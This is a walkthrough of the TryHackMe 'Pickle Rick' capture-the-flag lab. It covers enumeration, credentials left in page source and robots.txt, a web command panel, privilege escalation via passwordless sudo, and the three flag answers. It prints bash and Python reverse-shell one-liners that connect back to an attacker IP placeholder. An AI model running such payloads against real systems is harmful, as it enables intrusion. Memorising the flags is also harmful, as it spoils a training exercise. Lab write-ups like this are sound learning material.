<style>
    body{background-color: black;}
    h1{color: RGB(214, 255, 250);}
    p{color: RGB(214, 255, 250);}
    li{color: RGB(214, 255, 250);}
</style>

# TryHackMe Pickle Rick CTF writeup

First things first - Lets start enumerating!

The first thing to do is to inspect the source code of the website. Looking at website source code can yield results such as usernames, passwords, and/or other pieces of information, left behind. Looking at the source code yielded such results! We now have a username:

> R1ckRul3s

![Source Code](../../static/writeupimgs/picklerickimgs/SourceCode.png)

Looking at the website, there is not a whole lot going on as there is not any other content or links to interact with the website with. This is where we use a tool such as Gobuster to attempt to discover new directories as well as any files that may be hiding. Remember, it is important to attempt to enumerate both.

Using "directory-list-2.3-medium.txt" word list from SecList found [here](https://github.com/danielmiessler/SecLists), the enumeration of directories and files can begin with the command: `gobuster -x php,txt,html -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -u <target> -o pickledir.txt`

Next, as part of the enumeration process, nmap is ran to discover what ports and services our target is using. Using the command `nmap -vv -A -T4 -p- <target> -oN AllPortScan`, nmap will scan all the ports on the machine aggressively in order to capture what the service is being ran on each port. In this instance we have two ports:

1. Port 80 - The web server
2. Port 22 - SSH

Details of both the nmap and gobuster results scans can be found in the [Enumeration-Results](https://github.com/Sciratec/TryHackMe/tree/main/pickleRick/Enumeration-Results) directory. Now lets look at the results of the gobuster scan.

![GoBuster](../../static/writeupimgs/picklerickimgs/GoBuster.png "Gobuster scan")

Looks like we now have places to go and things to do. So lets start looking at these pages that gobuster dug up. Looks like we have 3 files that look interesting. Lets start with `/login.php`.


![login.php](../../static/writeupimgs/picklerickimgs/loginpage.png)

Looks like we found where the username maybe used. Lets continue onto `robots.txt`. For the sake of time, `portal.php` is a redirect to `login.php`.

![robots.txt](../../static/writeupimgs/picklerickimgs/wubbalubbadubdub.png)

> Wubbalubbadubdub

Wubbalubbadubdub! With that out of the way, what do we have here? Random text? Perhaps a password? Only one way to find out.

![loggedin](../../static/writeupimgs/picklerickimgs/loggedin.png)

In the words of Bender, "Neat". Looks like we have a command panel that is waiting for commands. What type of commands though? During our enumeration the nmap scan revealed that the machine is using Ubuntu Linux OS and Ubuntu uses Bash. So lets try a Bash command to verify this with the command `whomai`. A command to print out the current user.

![whomai](../../static/writeupimgs/picklerickimgs/whoami.png)

Woop, we have remote code execution! Lets get a feel for what is on the machine's backend. How about... listing everything in the current website root directory with `ls`?

![ls](../../static/writeupimgs/picklerickimgs/s.png)

Ah, here we see the files that were enumerated from the gobuster scan, but what is this? Two other interesting files that were not found during our enumeration, I wonder what their contents are. There is a command for that, namely the `cat` command.
> Sup3rS3cretPickl3Ingred.txt and clue.txt

![Cat Fail](../../static/writeupimgs/picklerickimgs/catfail.png)

I know Mr. Meeseek, that was a cat-tastrophe. Nope, not apologizing. Fortunately there is another command that can do the same thing, the `less` command. Like `cat` it prints the contents out of a file given, but utilizes pagination.

![First Flag](../../static/writeupimgs/picklerickimgs/firstflag.png)
> mr. meeseek hair

And boom goes the dynamite we have our first flag. While aging myself with that very old meme, and if you can recall, there was another text file that was left for us as a clue.

![clue.txt](../../static/writeupimgs/picklerickimgs/cluetxt.png)

Mmmk. Seems pretty simple. Like listing everything in a working directory we can use `ls` again to start enumerating other directories. Lets start in the `/home` directory which houses all of the users on the OS.


![users](../../static/writeupimgs/picklerickimgs/users.png)
> rick

It's pickle RII... no, no, no, not doing that. However, we can list everything in the `rick` user directory.

![Rick User Dir](../../static/writeupimgs/picklerickimgs/ricklist.png)

At this point we know what is needed to be done. However, unlike the other flag this one is different. It has a space in it. Yes, that actually matters. Not to worry, by appending trailing `\`s to both the end of string one and the beginning of string two such as, `second\ \ingredients` which escapes the whitespace and allows us to print out the contents.

![Second Flag](../../static/writeupimgs/picklerickimgs/secondflag.png)

> 1 jerry tear

At this point, there are no more clues, no more notes, but there is a third ingredient somewhere! Exhausting Bash command through our command panel seems not to do us any good. So for the command panel's final act, it will help gain a reverse shell into the machine. Knowing that we can run Bash, maybe we can use that to gain a reverse shell where we can use more commands and gives us a little more power

Turning to [the reverse shell cheatsheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md) we look for the Bash reverse shell to be ran. We set up our netcat listener on any port that we wish and run `bash -i >& /dev/tcp/<attacking ip/<port> 0>&1` looks promising - eeehh, that's a no.


All hope is lost. No, there is another... language we can use to possible gain a foothold. Ubuntu comes with another language called python, in which there is two versions python2 and python3. Now `which python` does it have? This gives us nothing. How about `which python3`? There it be, python3. Taking a look back to the cheatsheet shows that python can be utilized to gain a reverse shell. First, we set up our netcat listener

![netcat](../../static/writeupimgs/picklerickimgs/picklerickimgsnetcat.png)

Then execute payload `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<attacking ip>",port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'`


![Reverse Shell](../../static/writeupimgs/picklerickimgs/reverseshell.png)

That did it! We now have connected to the machine using a reverse shell. However, that third ingredient is still here somewhere, "stay on target". At this point, we have exhausted our search for the flag in areas we can get to, but what about areas that we cannot?

In Linux there is a command called `sudo` this is simple command can literally, yes literally break your operating system with improper use. This command allows for the escalation of privilege's and normal users if part of the sudo group can utilize this to temporary ascend to godhood. Lets see if our can use this powerful command and what it entails with `sudo -l`



![Sudo -l](../../static/writeupimgs/picklerickimgs/sudo.png)

You see this? This is a major no no. This is bad... for them. Our current user can use `sudo` with no password. At this point it should considered root as we can use this misconfigured sudo user to escalate directly to the root user with 0 authentication. To swtich users we use the `su` command. However paired with another command like `sudo` and you can not switch users using the built in escalation command to become root


![Priv Escalation](../../static/writeupimgs/picklerickimgs/escalation.png)

> I'm root


And just like that we have root. We could use `find / -name "*.txt" -type f 2>/dev/null` but that would search the whole system looking for anything with a .txt file and the results would be to much for me to sift through manually. So let us start simple and look into the /root directory. Like `/home`, but for root.

![Third Flag](../../static/writeupimgs/picklerickimgs/thirdflag.png)

And there it is, the third and final flag
> fleeb juice